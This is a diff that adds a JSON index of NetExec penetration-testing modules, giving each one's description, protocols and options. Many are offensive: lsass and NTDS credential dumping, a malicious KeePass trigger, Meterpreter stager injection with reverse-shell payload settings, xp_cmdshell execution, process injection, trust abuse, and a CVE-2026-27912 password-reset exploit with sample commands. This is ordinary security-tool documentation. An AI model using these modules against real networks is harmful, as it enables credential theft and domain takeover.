+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/gpp_privileges.py",
+      "name": "gpp_privileges",
+      "description": "Extracts privileges assigned via GPOs and resolves SIDs via LDAP.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "NO_LDAP      If set to True, disables LDAP queries for resolving SIDs."
+    },
+    {
+      "source": "nxc/modules/group-mem.py",
+      "name": "group-mem",
+      "description": "[REMOVED] Retrieves all the members within a Group",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "[REMOVED] Use the ldap flag '--groups \"Administrators\"' instead of the module group-mem.\n\ngroup-mem: Specify group-mem to call the module\nGROUP: Specify the GROUP option to query for that group's members\nUsage: nxc ldap $DC-IP -u Username -p Password -M group-mem -o GROUP=\"domain admins\"\n       nxc ldap $DC-IP -u Username -p Password -M group-mem -o GROUP=\"domain controllers\""
+    },
+    {
+      "source": "nxc/modules/groupmembership.py",
+      "name": "groupmembership",
+      "description": "Query the groups to which a user belongs.",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "USER    Choose a username to query group membership"
+    },
+    {
+      "source": "nxc/modules/handlekatz.py",
+      "name": "handlekatz",
+      "description": "Get lsass dump using handlekatz64 and parse the result with pypykatz",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\nHANDLEKATZ_PATH       Path where handlekatz.exe is on your system (default: /tmp/)\nHANDLEKATZ_EXE_NAME   Name of the handlekatz executable (default: handlekatz.exe)\nDIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = HANDLEKATZ_PATH)"
+    },
+    {
+      "source": "nxc/modules/hash_spider.py",
+      "name": "hash_spider",
+      "description": "Dump lsass recursively from a given hash using BH to find local admins",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "METHOD              Method to use to dump lsass.exe with lsassy\nRESET_DUMPED        Allows re-dumping of hosts. (Default: False)\nRESET               Reset DB. (Default: False)"
+    },
+    {
+      "source": "nxc/modules/hyperv-host.py",
+      "name": "hyperv-host",
+      "description": "Performs a registry query on the VM to lookup its HyperV Host",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/iis.py",
+      "name": "iis",
+      "description": "Checks for credentials in IIS Application Pool configuration files using appcmd.exe",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/impersonate.py",
+      "name": "impersonate",
+      "description": "List and impersonate tokens to run command as locally logged on users",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "TOKEN     // Token id to usurp\nEXEC      // Command to exec\nIMP_EXE   // Path to the Impersonate binary on your local computer"
+    },
+    {
+      "source": "nxc/modules/install_elevated.py",
+      "name": "install_elevated",
+      "description": "Checks for AlwaysInstallElevated",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/ioxidresolver.py",
+      "name": "ioxidresolver",
+      "description": "This module helps you to identify hosts that have additional active interfaces",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "DIFFERENT show only ip address if different from target ip (Default: False)"
+    },
+    {
+      "source": "nxc/modules/keepass_discover.py",
+      "name": "keepass_discover",
+      "description": "Search for KeePass-related files and process.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "SEARCH_TYPE     Specify what to search, between:\n                  PROCESS     Look for running KeePass.exe process only\n                  FILES       Look for KeePass-related files (KeePass.config.xml, .kdbx, KeePass.exe) only, may take some time\n                  ALL         Look for running KeePass.exe process and KeePass-related files (default)\n\nSEARCH_PATH     Comma-separated remote locations where to search for KeePass-related files (you must add single quotes around the paths if they include spaces)\n                Default: 'C:\\\\Users\\\\','$env:PROGRAMFILES','env:ProgramFiles(x86)'"
+    },
+    {
+      "source": "nxc/modules/keepass_trigger.py",
+      "name": "keepass_trigger",
+      "description": "Set up a malicious KeePass trigger to export the database in cleartext.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "ACTION (mandatory)      Performs one of the following actions, specified by the user:\n                          ADD           insert a new malicious trigger into KEEPASS_CONFIG_PATH's specified file\n                          CHECK         check if a malicious trigger is currently set in KEEPASS_CONFIG_PATH's\n                                        specified file\n                          RESTART       restart KeePass using a Windows service (used to force trigger reload),\n                                        if multiple KeePass process are running, rely on USER option\n                          POLL          search for EXPORT_NAME file in EXPORT_PATH folder\n                                        (until found, or manually exited by the user)\n                          CLEAN         remove malicious trigger from KEEPASS_CONFIG_PATH as well as database\n                                        export files from EXPORT_PATH\n                          ALL           performs ADD, CHECK, RESTART, POLL, CLEAN actions one after the other\n\nKEEPASS_CONFIG_PATH     Path of the remote KeePass configuration file where to add a malicious trigger\n                        (used by ADD, CHECK and CLEAN actions)\nUSER                    Targeted user running KeePass, used to restart the appropriate process\n                        (used by RESTART action)\n\nEXPORT_NAME             Name of the database export file, default: export.xml\nEXPORT_PATH             Path where to export the KeePass database in cleartext\n                        default: C:\\\\Users\\\\Public, %APPDATA% works well too for user permissions\n\nPSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use\n                        (while no 'malicious' command is executed):\n                          ENCODE        run scripts through encoded oneliners\n                          PS1           run scripts through a file dropped in C:\\\\Windows\\\\Temp (default)\n\nNot all variables used by the module are available as options (ex: trigger name, temp folder path, etc.),\nbut they can still be easily edited in the module __init__ code if needed"
+    },
+    {
+      "source": "nxc/modules/laps.py",
+      "name": "laps",
+      "description": "Retrieves all LAPS passwords which the account has read permissions for.",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *"
+    },
+    {
+      "source": "nxc/modules/ldap-checker.py",
+      "name": "ldap-checker",
+      "description": "[REMOVED] Checks whether LDAP signing and channel binding are required and / or enforced",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available."
+    },
+    {
+      "source": "nxc/modules/link_enable_cmdshell.py",
+      "name": "link_enable_cmdshell",
+      "description": "Enable or disable xp_cmdshell on a linked MSSQL server",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Defines the options for enabling or disabling xp_cmdshell on the linked server.\nACTION           Specifies whether to enable or disable:\n                  - enable (default)\n                  - disable\nLINKED_SERVER    The name of the linked SQL server to target."
+    },
+    {
+      "source": "nxc/modules/link_xpcmd.py",
+      "name": "link_xpcmd",
+      "description": "Run xp_cmdshell commands on a linked SQL server",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Defines the options for running xp_cmdshell commands on a linked server.\nLINKED_SERVER    The name of the linked SQL server to target.\nCMD              The command to run via xp_cmdshell."
+    },
+    {
+      "source": "nxc/modules/lockscreendoors.py",
+      "name": "lockscreendoors",
+      "description": "Detect Windows lock screen backdoors by checking FileDescriptions of accessibility binaries.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/lsassy.py",
+      "name": "lsassy",
+      "description": "Dump lsass and parse the result remotely with lsassy",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "METHOD              Method to use to dump lsass.exe with lsassy\nDUMP_TICKETS        If set, will dump Kerberos tickets (Default: True)\nSAVE_DIR            Directory to save dumped tickets\nSAVE_TYPE           Type of ticket to save, either 'kirbi' or 'ccache' (Default: 'ccache')"
+    },
+    {
+      "source": "nxc/modules/maq.py",
+      "name": "maq",
+      "description": "Retrieves the MachineAccountQuota domain-level attribute",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/masky.py",
+      "name": "masky",
+      "description": "Remotely dump domain user credentials via an ADCS and a KDC",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "CA              Certificate Authority Name (CA_SERVER\\CA_NAME)\nTEMPLATE        Template name allowing users to authenticate with (default: User)\nDC_IP           IP Address of the domain controller\nAGENT_EXE       Path to a custom executable masky agent to be deployed"
+    },
+    {
+      "source": "nxc/modules/met_inject.py",
+      "name": "met_inject",
+      "description": "Downloads the Meterpreter stager and injects it into memory",
+      "supported_protocols": [
+        "smb",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "SRVHOST     IP hosting of the stager server\nSRVPORT     Stager port\nRAND        Random string given by metasploit (if using web_delivery)\nSSL         Stager server use https or http (default: https)\n\nThis module is compatable with --obfs, --force-ps32 (PowerShell execution options)\n\nmulti/handler method that don't require RAND:\n    Set LHOST and LPORT (called SRVHOST and SRVPORT in nxc module options)\n    Set payload to one of the following (non-exhaustive list):\n        windows/x64/powershell_reverse_tcp\n        windows/x64/powershell_reverse_tcp_ssl\nWeb Delivery Method (exploit/multi/script/web_delivery):\n    Set SRVHOST and SRVPORT\n    Set target 2 (PSH)\n    Set payload to what you want (windows/meterpreter/reverse_https, etc)\n        check compatabile payloads with `show payloads`\n    Optional: SET URIPATH {custom}\n    After running, copy the end of the URL printed (e.g. M5LemwmDHV) and set RAND to that, or whatever you set URIPATH to"
+    },
+    {
+      "source": "nxc/modules/mobaxterm.py",
+      "name": "mobaxterm",
+      "description": "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/modify-group.py",
+      "name": "modify-group",
+      "description": "Modify the group membership of users and computers",
+      "supported_protocols": [
+        "smb",
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Required (at least one of):\nGROUP       Name of the group to add/remove the user to/from\nUSER        Username of the account to modify\n\nOptional:\nREMOVE      Set to 'True' to remove the user from the specified group instead of adding (default: False)\n\nExamples\n--------\nAdding a user to a group:\n    netexec smb <DC_IP> -u adminuser -p password -M modify-group -o USER='targetuser' GROUP='Domain Admins'\n    netexec ldap <DC_IP> -u adminuser -p password -M modify-group -o USER='targetuser' GROUP='Enterprise Admins'\n\nRemoving a user from a group:\n    netexec smb <DC_IP> -u adminuser -p password -M modify-group -o USER='targetuser' GROUP='Domain Admins' REMOVE=True\n    netexec ldap <DC_IP> -u adminuser -p password -M modify-group -o USER='targetuser' GROUP='Enterprise Admins' REMOVE=True\n\nSMB/SAMR KNOWN LIMITATIONS:\n    - SAMR only supports modification of Global security groups.\n      Domain Local and Universal groups require the LDAP protocol.\n    - Cross-domain groups (e.g. Enterprise Admins) cannot be modified via SAMR.\n      Use LDAP instead."
+    },
+    {
+      "source": "nxc/modules/mremoteng.py",
+      "name": "mremoteng",
+      "description": "Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) ",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "SHARE           Share parsed. Default to C$\nPASSWORD        Custom password to decrypt confCons.xml files\nCUSTOM_PATH     Custom path to confCons.xml file"
+    },
+    {
+      "source": "nxc/modules/ms17-010.py",
+      "name": "ms17-010",
+      "description": "MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB ENVIRONMENT",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/msol.py",
+      "name": "msol",
+      "description": "Dump MSOL cleartext password and Entra ID credentials from the localDB on the Entra ID Connect Server",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No module options available."
+    },
+    {
+      "source": "nxc/modules/mssql_cbt.py",
+      "name": "mssql_cbt",
+      "description": "Checks whether Channel Binding is enabled on the MSSQL database",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/mssql_coerce.py",
+      "name": "mssql_coerce",
+      "description": "Execute SQL commands To interact with a specified LISTENER for coercion/exfiltration",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LISTENER       LISTENER for exploitation\nL              Alias for LISTENER"
+    },
+    {
+      "source": "nxc/modules/mssql_dumper.py",
+      "name": "mssql_dumper",
+      "description": "Search for Sensitive Data across all databases",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SHOW_DATA    Display the actual row data values of the matched columns (default: True)\nREGEX        Semicolon-separated regex(es) to search for in **Cell Values**\nLIKE_SEARCH  Comma-separated list or filename of column names to specifically look for\nUSE_PRESET   Use a predefined set of regex patterns for common PII (default: True)\nSAVE         Save the output to sqlite database (default: True)"
+    },
+    {
+      "source": "nxc/modules/mssql_priv.py",
+      "name": "mssql_priv",
+      "description": "Enumerate and exploit MSSQL privileges",
+      "supported_protocols": [
+        "mssql"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "ACTION    Specifies the action to perform:\n    - enum_priv (default)\n    - privesc\n    - rollback (remove sysadmin privilege)"
+    },
+    {
+      "source": "nxc/modules/nanodump.py",
+      "name": "nanodump",
+      "description": "Get lsass dump using nanodump and parse the result with pypykatz",
+      "supported_protocols": [
+        "smb",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\nNANO_PATH           Path where nano.exe is on your system (default: OS temp directory)\nNANO_EXE_NAME       Name of the nano executable (default: nano.exe)\nDIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)"
+    },
+    {
+      "source": "nxc/modules/nopac.py",
+      "name": "nopac",
+      "description": "Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/notepad++.py",
+      "name": "notepad++",
+      "description": "Extracts notepad++ unsaved files.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/notepad.py",
+      "name": "notepad",
+      "description": "Extracts content from Windows Notepad tab state binary files.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "KILL                // Kill for notepad.exe process. Default False."
+    },
+    {
+      "source": "nxc/modules/ntds-dump-raw.py",
+      "name": "ntds-dump-raw",
+      "description": "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive.",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "TARGET: Specify the source from which the hashes will be extracted [NTDS, SAM, LSA] or any combination of them\nUsage: nxc smb $IP -u Username -p Password -M ntds-dump-raw -o TARGET=SAM\n       nxc smb $IP -u Username -p Password -M ntds-dump-raw -o TARGET=NTDS,LSA,SAM\n$IP can be a Domain Controller or a regular Windows machine."
+    },
+    {
+      "source": "nxc/modules/ntdsutil.py",
+      "name": "ntdsutil",
+      "description": "Dump NTDS with ntdsutil",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "Dump NTDS with ntdsutil\nModule by @zblurx\n\nDIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing"
+    },
+    {
+      "source": "nxc/modules/ntlm_reflection.py",
+      "name": "ntlm_reflection",
+      "description": "[REMOVED] This module has been integrated into the enum_cve module.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "opsec_safe": true,
+      "multiple_hosts": true,
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/ntlmv1.py",
+      "name": "ntlmv1",
+      "description": "Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/obsolete.py",
+      "name": "obsolete",
+      "description": "Extract all obsolete operating systems from LDAP",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No module-specific options required."
+    },
+    {
+      "source": "nxc/modules/onelogon.py",
+      "name": "onelogon",
+      "description": "Scan GPOs and registry for machine accounts vulnerable to Onelogon",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login",
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/petitpotam.py",
+      "name": "petitpotam",
+      "description": "[REMOVED] Module to check if the DC is vulnerable to PetitPotam, credit to @topotam",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LISTENER            IP of your listener\nPIPE                Default PIPE (default: lsarpc)"
+    },
+    {
+      "source": "nxc/modules/pi.py",
+      "name": "pi",
+      "description": "Run command as logged on users via Process Injection",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "PID       // Process ID for Target User, PID=pid\nEXEC      // Command to exec, EXEC='command'  Single quote is better to use\n\nThis module reads the executed command output under the name C:\\windows\\temp\\output.txt and deletes it. In case of a possible error, it may need to be deleted manually."
+    },
+    {
+      "source": "nxc/modules/powershell_history.py",
+      "name": "powershell_history",
+      "description": "Extracts PowerShell history for all users and looks for sensitive commands.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/pre2k.py",
+      "name": "pre2k",
+      "description": "Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "ALL     Attempt to authenticate for every computer object in the domain (default: False)\n\nExamples:\nnxc ldap $IP -u $USER -p $PASSWORD -M pre2k\nnxc ldap $IP -u $USER -p $PASSWORD -M pre2k -o ALL=True"
+    },
+    {
+      "source": "nxc/modules/presence.py",
+      "name": "presence",
+      "description": "Traces Domain and Enterprise Admin presence in the target over SMB",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "There are no module options."
+    },
+    {
+      "source": "nxc/modules/printerbug.py",
+      "name": "printerbug",
+      "description": "[REMOVED] Module to check if the Target is vulnerable to PrinterBug. Set LISTENER IP for coercion.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LISTENER    Listener Address (defaults to 127.0.0.1)"
+    },
+    {
+      "source": "nxc/modules/printnightmare.py",
+      "name": "printnightmare",
+      "description": "Check if host vulnerable to printnightmare",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "PORT    Port to check (defaults to 445)"
+    },
+    {
+      "source": "nxc/modules/procdump.py",
+      "name": "procdump",
+      "description": "Get lsass dump using procdump64 and parse the result with pypykatz",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\nPROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/), if changed embeded version will not be used\nPROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe), if changed embeded version will not be used\nDIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = PROCDUMP_PATH)"
+    },
+    {
+      "source": "nxc/modules/pso.py",
+      "name": "pso",
+      "description": "[REMOVED] This module moved to the core option --pso",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available."
+    },
+    {
+      "source": "nxc/modules/putty.py",
+      "name": "putty",
+      "description": "Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/raisechild.py",
+      "name": "raisechild",
+      "description": "Compromise parent domain from child domain via trust abuse",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "Forge a Kerberos TGT using the child domain's krbtgt hash, with an extra SID targeting privileged groups in the parent domain.\nRequires an existing trust with the parent.\n\nUSER        Target username to forge the ticket for (default: Administrator)\nUSER_ID     RID used as the user ID in the PAC (default: 500)\nRID         RID used for the extra SID (default: 519 = Enterprise Admins)\nETYPE       Encryption type for the ticket: rc4, aes128, aes256 (default: rc4)\n\nExamples:\nnetexec ldap <ip> -u <username> -p <password> -M raisechild -o USER=DC01$\nnetexec ldap <ip> -u <username> -p <password> -M raisechild -o USER_ID=1001\nnetexec ldap <ip> -u <username> -p <password> -M raisechild -o RID=512\nnetexec ldap <ip> -u <username> -p <password> -M raisechild -o ETYPE=aes256"
+    },
+    {
+      "source": "nxc/modules/rclone.py",
+      "name": "rclone",
+      "description": "Searches for rclone.conf and deobscures credentials",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No module options."
+    },
+    {
+      "source": "nxc/modules/rdcman.py",
+      "name": "rdcman",
+      "description": "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/rdp.py",
+      "name": "rdp",
+      "description": "Enables/Disables RDP",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "ACTION          Enable/Disable RDP (choices: enable, disable, enable-ram, disable-ram)\nMETHOD          wmi(ncacn_ip_tcp)/smb(ncacn_np) (choices: wmi, smb, default is wmi)\nOLD             For old version system (under NT6, like: server 2003)\nDCOM-TIMEOUT    Set the Dcom connection timeout for WMI method (Default is 10 seconds)\nnxc smb 192.168.1.1 -u {user} -p {password} -M rdp -o ACTION={enable, disable, enable-ram, disable-ram} {OLD=true} {DCOM-TIMEOUT=5}\nnxc smb 192.168.1.1 -u {user} -p {password} -M rdp -o METHOD=smb ACTION={enable, disable, enable-ram, disable-ram}\nnxc smb 192.168.1.1 -u {user} -p {password} -M rdp -o METHOD=wmi ACTION={enable, disable, enable-ram, disable-ram} {OLD=true} {DCOM-TIMEOUT=5}"
+    },
+    {
+      "source": "nxc/modules/recent_files.py",
+      "name": "recent_files",
+      "description": "Extracts recently modified files",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/recyclebin.py",
+      "name": "recyclebin",
+      "description": "Lists and exports users' recycle bins",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/reg-query.py",
+      "name": "reg-query",
+      "description": "Performs a registry query on the machine",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "PATH    Registry key path to query\nKEY     Registry key value to retrieve\nVALUE   Registry key value to set (only used for modification)\n        Will add a new registry key if the registry key does not already exist\nTYPE    Type of registry to modify, add or delete. Default type : REG_SZ.\n        Type supported: REG_NONE, REG_SZ, REG_EXPAND_SZ,REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD\nDELETE  If set to True, delete a registry key if it does exist"
+    },
+    {
+      "source": "nxc/modules/reg-winlogon.py",
+      "name": "reg-winlogon",
+      "description": "Collect autologon credential stored in the registry",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/remote-uac.py",
+      "name": "remote-uac",
+      "description": "Enable or disable remote UAC",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "Enables UAC (prevent non RID500 account to get high priv token remotely)\nDisables UAC (allow non RID500 account to get high priv token remotely)\n\nACTION:     \"enable\" or \"disable\" (required)"
+    },
+    {
+      "source": "nxc/modules/remove-mic.py",
+      "name": "remove-mic",
+      "description": "Check if host vulnerable to CVE-2019-1040",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "PORT    Port to check (defaults to 445)"
+    },
+    {
+      "source": "nxc/modules/resetnightmare.py",
+      "name": "resetnightmare",
+      "description": "Exploit ResetNightmare (CVE-2026-27912) to reset any account's password via Kerberos change password",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "Reset any account's password by abusing the Kerberos Change Password protocol (CVE-2026-27912, ResetNightmare).\nRequires GenericWrite over a controlled account's userPrincipalName, and an unpatched DC.\n\nTARGET          sAMAccountName of the account whose password gets reset (append $ for a computer)\nNEW_PASSWORD    New password to set on TARGET\nUPN_USER        sAMAccountName of a controlled account you can write a userPrincipalName to (not the login account)\nUPN_PASSWORD    Cleartext password of UPN_USER\nUPN_NTHASH      NT Hash of UPN_USER\n\nExamples:\nnetexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_PASSWORD='Passw0rd!'\nnetexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_NTHASH='31d6cfe0d16ae931b73c59d7e0c089c0'\nnetexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=DC01$ NEW_PASSWORD='NewPass!' UPN_USER=controlled$ UPN_PASSWORD='Passw0rd!'"
+    },
+    {
+      "source": "nxc/modules/runasppl.py",
+      "name": "runasppl",
+      "description": "Check if the registry value RunAsPPL is set or not",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/sccm-recon6.py",
+      "name": "sccm-recon6",
+      "description": "Check if target is a Distribution point or Primary Site Server through winreg (RECON-6)",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/sccm.py",
+      "name": "sccm",
+      "description": "Find a SCCM infrastructure in the Active Directory",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "BASE_DN            The base domain name for the LDAP query\nREC_RESOLVE        Resolve members of groups recursively. Default: False"
+    },
+    {
+      "source": "nxc/modules/schtask_as.py",
+      "name": "schtask_as",
+      "description": "Remotely execute a scheduled task as a logged on user",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
